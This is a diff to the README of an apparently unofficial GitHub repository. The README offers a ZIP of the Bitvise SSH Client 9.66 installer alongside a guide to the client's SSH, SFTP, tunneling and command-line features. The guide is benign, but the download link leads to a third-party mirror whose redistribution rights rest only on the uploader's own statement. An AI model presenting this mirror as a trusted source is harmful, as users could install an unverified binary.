@@ -1,12 +1,12 @@
-# Bitvise SSH Client for Windows: SSH, SFTP, SCP, and Tunneling Guide
+# Bitvise SSH Client for Windows: Complete SSH, SFTP, SCP, and Tunneling Guide
 
-> Download Bitvise SSH Client from the official source and learn how to use its Windows SSH terminal, secure file transfer, and SSH tunneling features.
+> A detailed introduction to Bitvise SSH Client (BvSshClient): secure remote terminal access, file transfer, port forwarding, command-line tools, installation, and security practices for Windows.
 
 ![Platform](https://img.shields.io/badge/platform-Windows-0078D4?logo=windows&logoColor=white)
 ![Protocol](https://img.shields.io/badge/protocol-SSH2-2563EB)
 ![Guide](https://img.shields.io/badge/type-practical%20guide-7C3AED)
 
-## Download Bitvise SSH Client
+## Download Bitvise SSH Client 9.66
 
 <p align="center">
   <a href="https://github.com/rvtoolsofficial/bitvise-ssh-client-download/releases/latest/download/Bitvise-SSH-Client-9.66.zip">
@@ -18,75 +18,158 @@
   <a href="https://github.com/rvtoolsofficial/bitvise-ssh-client-download/releases/latest">Download latest version from Releases</a>
 </p>
 
-The ZIP contains the original Bitvise SSH Client 9.66 installer. After downloading, extract the archive and verify the installer’s digital signature using Bitvise’s [signature verification guide](https://www.bitvise.com/verify-installer-signature) before launching it.
+The ZIP contains the original Bitvise SSH Client 9.66 installer. Extract the archive and verify the installer's digital signature with Bitvise's [signature verification guide](https://www.bitvise.com/verify-installer-signature) before launching it. For license terms, read the [Bitvise SSH Client EULA](https://www.bitvise.com/ssh-client-license).
 
 ## What is Bitvise SSH Client?
 
-**Bitvise SSH Client**, also known as **BvSshClient** and historically as **Tunnelier**, is a Windows SSH2 client. Bitvise describes support for SSH terminal access, file transfer, and tunneling. It is a client: it initiates secure connections to SSH servers; it does not itself make the Windows computer an SSH server.
+**Bitvise SSH Client**, also known as **BvSshClient** and historically as **Tunnelier**, is a Windows application for establishing SSH2 connections to remote SSH servers. It combines an SSH terminal, graphical SFTP file transfer, tunneling and port forwarding, and command-line tools in one client package.
 
-## What can you do with it?
+An SSH client initiates connections. It is not an SSH server and does not, by itself, enable incoming remote logins to your Windows computer. Bitvise SSH Client and Bitvise SSH Server are separate products with separate licensing.
 
-- **SSH terminal:** connect to a remote shell for interactive administration.
-- **SFTP file transfer:** browse and transfer files over an SSH connection.
-- **SCP transfers:** copy files using the Secure Copy Protocol where supported by the server and configuration.
-- **SSH tunneling / port forwarding:** forward selected TCP connections through an SSH session.
-- **Automation:** use supported client features and command-line options for repeatable connection workflows; consult the official documentation for exact syntax.
+Bitvise says SSH Client can be used free of charge in all types of environments, subject to its current license terms. The vendor's product page lists Windows desktop and server support, including Windows 11 and Windows Server 2025; check the current product documentation for exact version compatibility.
 
-Feature availability depends on the client version, server configuration, and your authorization on the remote system.
+## Main features
 
-## First connection checklist
+### SSH terminal and remote console
 
-1. Download the installer from the official Bitvise link above.
-2. Before running it, verify its digital signature as described in [Bitvise's signature verification guide](https://www.bitvise.com/verify-installer-signature). Do not run the installer if the signature is missing or invalid.
-3. In the client, enter the SSH server host and port provided by your administrator.
-4. Choose an authentication method supported by the server, such as a password or SSH key.
-5. Verify the server's host key fingerprint through a trusted channel before accepting it, especially on the first connection.
-6. Connect only to systems you own or are authorized to access.
-7. For file transfer, use the SFTP interface and verify the remote path before uploading, overwriting, or deleting files.
+Connect to a command-line shell on an SSH server. Bitvise documents terminal emulation for **bvterm**, **xterm**, and **VT-100**. Terminal capabilities depend on the server and selected terminal type. The client also includes `stermc`, a command-line terminal client, and `sexec` for scripted remote command execution.
 
-## SSH tunneling: use with care
+### Graphical SFTP file transfer
 
-SSH port forwarding can provide access to services through an SSH connection. Use it only when you are authorized to access both the SSH server and the forwarded service. Restrict listeners to the narrowest needed interface and destination, and avoid exposing a local forwarded port to other devices unless that is an intentional, approved configuration.
+Use the graphical SFTP interface to browse local and remote files and transfer them over an SSH connection. The vendor describes features including transfer resumption and directory mirroring when the server supports the required SFTP v6 integrity extensions. Actual performance depends on the server, network, storage, and configuration.
+
+### SCP support
+
+SCP is available for copy workflows where supported by the remote side. For interactive browsing and common file-management tasks, the integrated SFTP interface is often the more convenient choice. SFTP and SCP are different protocols; follow the server administrator's guidance about which one to use.
+
+### SSH tunneling and port forwarding
+
+Forward selected TCP connections through an SSH session. Bitvise documents static forwarding and dynamic forwarding through integrated SOCKS and HTTP CONNECT proxy protocols. Profiles can save forwarding configurations for reuse.
+
+Tunnels can expose otherwise restricted services. Use them only with authorization, forward only the required destination and port, and avoid exposing local listeners to other devices unless that is explicitly intended.
+
+### SSH jump proxy
+
+Connect to a destination SSH or SFTP server through an intermediate SSH jump server. This can be useful in networks where administrative hosts are reachable only through a controlled bastion. Configure the jump host and destination according to your organization’s access policy.
+
+### SFTP drive mapping
+
+The vendor documents an SFTP drive feature that lets Windows applications access files on an SFTP server through a mapped drive. This can help applications that expect file-system paths, but application compatibility and remote permissions still apply.
+
+### FTP-to-SFTP bridge
+
+Bitvise includes a bridge that allows some legacy FTP clients to communicate with an SFTP server through a local translation layer. The bridge does not turn FTP into SSH by itself; it provides the FTP application's interface while the onward file transfer uses SFTP. Prefer a native SFTP client when available.
+
+### Command-line tools and scripting
+
+The product page documents these included tools:
+
+- **`sftpc`** — scriptable command-line SFTP client.
+- **`sexec`** — scriptable remote command execution.
+- **`stermc`** — command-line terminal client.
+- **`stnlc`** — scriptable tunneling and port-forwarding client.
+
+Bitvise states that its command-line clients can use settings and key material from the graphical client. Review the official product documentation and command help for supported syntax and options before automating a workflow.
+
+### Authentication and cryptography
+
+Bitvise lists public-key authentication options including **Ed25519, ECDSA, and RSA**, as well as Windows-domain single sign-on through **SSPI/GSSAPI Kerberos 5** and NTLM scenarios. Supported options depend on the client version and SSH server configuration. The vendor also describes post-quantum key exchange support outside FIPS mode; consult Bitvise's current technical documentation for algorithm specifics and compatibility.
+
+## Common use cases
+
+- **Remote administration:** open a terminal on an authorized server and run administrative commands.
+- **Secure file exchange:** use SFTP to upload deployment files, retrieve logs, or manage remote directories.
+- **Bastion access:** reach an internal SSH/SFTP host through an approved jump server.
+- **Application access through a tunnel:** route a specific local application's TCP connection through SSH.
+- **Repeatable operations:** use `sftpc`, `sexec`, `stermc`, or `stnlc` for approved scripts and controlled automation.
+- **Legacy client compatibility:** use the FTP-to-SFTP bridge where a legacy FTP interface is required and the arrangement is approved.
+
+## Getting started
+
+1. Download the ZIP above and extract the installer.
+2. Before running it, verify its digital signature using [Bitvise's verification steps](https://www.bitvise.com/verify-installer-signature). Do not run an installer if the signature is missing or invalid.
+3. Install the client and launch the graphical SSH Client.
+4. Enter the server hostname and port provided by the system administrator.
+5. Select an authentication method configured for your account, such as a password, SSH key, or supported domain SSO.
+6. On first connection, verify the server host-key fingerprint through a separate trusted channel before accepting it.
+7. Start a terminal or open the SFTP interface, depending on your task.
+8. Save a connection profile only if permitted by your organization's credential and configuration policy.
+
+## SSH tunneling: a safe configuration checklist
+
+- Confirm that you are authorized to access the SSH server and the forwarded service.
+- Specify the narrowest destination host and port necessary for the task.
+- Prefer a local-only listener unless other devices explicitly need access.
+- Do not use tunneling to bypass network access controls or expose internal services without approval.
+- Close the SSH session when the tunnel is no longer required.
+
+## Troubleshooting
+
+### Connection refused or timed out
+
+Confirm the hostname, port, network route, VPN requirements, and that the remote SSH service is listening. Ask the server administrator before changing firewall rules.
+
+### Host-key warning after a server change
+
+A changed host key may be expected after a planned rebuild, but it can also indicate a connection to the wrong host or a security issue. Verify the new fingerprint with the administrator through a trusted, independent channel before accepting it.
+
+### Public-key authentication fails
+
+Check that the correct private key is selected, that the server has the matching public key, that the account is correct, and that key-file permissions and server policy allow use. Never send a private key to a support forum.
+
+### SFTP access is denied
+
+Check the remote account's permissions and SFTP restrictions with the server administrator. Confirm that you are using the expected remote path and protocol.
+
+### The installer will not start
+
+Bitvise notes that Windows security settings can affect downloaded installers. Consult the [official download page](https://www.bitvise.com/ssh-client-download) and follow its current troubleshooting advice; always verify the digital signature before running the file.
 
 ## Security best practices
 
-- Verify the SSH host key; do not dismiss changed-host-key warnings without investigation.
-- Protect private keys with appropriate file-system permissions and a passphrase where practical.
-- Use least-privilege accounts and restrict access on the SSH server.
-- Do not paste passwords, private keys, or tokens into public issue trackers or repositories.
-- Verify the downloaded installer's digital signature before launching it.
-- Keep the client updated from Bitvise's official download page.
+- Verify the SSH server's host key; investigate unexpected changes.
+- Use least-privilege accounts and authentication methods approved by the server owner.
+- Protect private keys with appropriate file permissions and a passphrase where practical.
+- Do not store passwords or tokens in scripts, public repositories, or command-line arguments.
+- Limit port-forwarding rules and listeners to the required systems and ports.
+- Verify the installer's Bitvise digital signature before execution.
+- Keep the client current using the official Bitvise download information.
 
-## License and installer redistribution
+## License and product status
 
-Bitvise SSH Client can be used free of charge under Bitvise's license terms. The EULA separately says that providing a copy of the program or installer to a third party requires advance, specific written approval from Bitvise. For that reason, this ZIP mirror is published based on the uploader's statement that they have advance written authorization from Bitvise. Read the [Bitvise SSH Client license terms](https://www.bitvise.com/ssh-client-license) before use.
+Bitvise SSH Client and Bitvise SSH Server are separate products. Bitvise states that SSH Client is available for free use in all types of environments, subject to its EULA. The EULA separately restricts providing copies of the installer to third parties without advance, specific written approval. This ZIP mirror is published based on the uploader's statement that such written authorization is held. This independent guide is not an official Bitvise support channel.
 
 ## Frequently asked questions
 
+### Is Bitvise SSH Client an SSH server?
+
+No. It is an SSH client for initiating connections to SSH servers. Bitvise SSH Server is a separate product.
+
+### Does Bitvise SSH Client include SFTP?
+
+Yes. Bitvise describes an integrated graphical SFTP client as well as the scriptable `sftpc` command-line client.
+
+### Can Bitvise create an SSH tunnel?
+
+Yes. The product includes SSH port-forwarding and dynamic tunneling features. Configure only authorized, narrowly scoped forwards.
+
 ### Is Bitvise SSH Client free?
 
-Bitvise says the SSH Client can be used free of charge in all types of environments. Review its current EULA for all terms and conditions.
+Bitvise states that SSH Client can be used free of charge in all types of environments. Review the current EULA for the full terms.
 
-### Is Bitvise SSH Client the same as Bitvise SSH Server?
+### How do I verify the installer?
 
-No. They are separate products. SSH Client connects to an SSH server; Bitvise SSH Server is a separate product with separate licensing.
-
-### Where can I download Bitvise SSH Client?
-
-Use the green button above to download the authorized ZIP mirror, or use the official Bitvise download page for the latest installer. Verify the installer's digital signature before running it.
-
-### How can I verify the installer?
-
-Follow Bitvise's [installer signature verification steps](https://www.bitvise.com/verify-installer-signature). Windows should report that the digital signature is OK and the signer should be Bitvise.
+Use Bitvise's [official digital-signature verification instructions](https://www.bitvise.com/verify-installer-signature) and confirm Windows reports that the signature is OK and the signer is Bitvise.
 
 ## Official resources
 
-- [Bitvise SSH Client overview](https://www.bitvise.com/ssh-client)
+- [Bitvise SSH Client overview and features](https://www.bitvise.com/ssh-client)
 - [Official download page](https://www.bitvise.com/ssh-client-download)
 - [Installer signature verification](https://www.bitvise.com/verify-installer-signature)
 - [Bitvise SSH Client license terms](https://www.bitvise.com/ssh-client-license)
+- [Bitvise SSH Client version history](https://www.bitvise.com/ssh-client-version-history)
 - [SSH and SSH2 overview](https://www.bitvise.com/ssh2)
 
 ---
 
-**Topics:** Bitvise SSH Client · BvSshClient · Tunnelier · Windows SSH client · SSH terminal · SFTP client · SCP file transfer · SSH tunnel · SSH port forwarding · secure file transfer · system administration · DevOps
+**Topics:** Bitvise SSH Client · BvSshClient · Tunnelier · Windows SSH client · SSH2 · remote terminal · SFTP client · SCP · file transfer · SSH jump host · SSH tunnel · port forwarding · SOCKS proxy · HTTP CONNECT · sftpc · sexec · stermc · stnlc · system administration · DevOps
